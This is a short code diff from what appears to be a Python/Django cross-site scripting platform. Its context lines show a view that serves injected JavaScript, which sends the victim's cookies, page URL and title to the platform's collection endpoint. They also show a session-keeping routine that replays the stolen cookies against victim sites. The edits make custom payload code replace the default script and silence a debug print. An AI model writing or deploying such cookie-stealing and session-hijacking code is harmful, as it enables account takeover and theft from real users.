@@ -69,7 +69,7 @@ def xss_js(request):
     x.src=''+'%s'+'?id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
     """ % (BASE_URL + "get_cookie/", p.id)
     if p.custom_js:
-        js = js + p.custom_js_content
+        js =  p.custom_js_content
     return HttpResponse(js)
 
 
@@ -138,7 +138,7 @@ def keep_session(request):
                 req = urllib2.Request(record.url)
                 req.add_header("cookie", record.cookie)
                 response = urllib2.urlopen(req)
-                print response.read()
+                #print response.read()
             except urllib2.URLError:
                 pass
 
